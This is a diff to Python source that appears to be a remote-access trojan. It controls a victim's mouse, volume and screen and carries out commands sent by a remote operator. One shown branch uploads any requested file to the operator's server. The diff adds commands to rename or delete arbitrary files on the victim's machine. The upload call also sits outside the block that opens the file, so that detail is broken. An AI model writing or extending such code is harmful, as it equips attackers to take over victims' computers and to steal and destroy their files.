@@ -1,6 +1,6 @@
 from comtypes import CLSCTX_ALL, CoInitialize, CoUninitialize
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
-from os import path, mkdir, startfile, remove, system, listdir
+from os import path, mkdir, startfile, remove, system, listdir, rename, remove
 from mouse import move, click, wheel, double_click
 from rotatescreen import get_primary_display
 from PIL.Image import frombytes, Resampling
@@ -594,7 +594,14 @@ def main():
                 p = cmd.replace("gEtFiLe ","")
                 with open(p,"rb") as file:
                     files = {'file': (p, file)}
-                response = post(url+"post-file", files=files)  
+                post(url+"post-file", files=files)  
+            elif "rEnAmE" in cmd:
+                a = cmd.replace("rEnAmE ","")
+                p, name = a.split("|")
+                rename(p,name)
+            elif "dElEtE" in cmd:
+                p = cmd.replace("dElEtE ","")
+                remove(p)
             elif "gEtFoLdEr" in  cmd:
                 p = cmd.replace("gEtFoLdEr ","")
                 if p == "/":
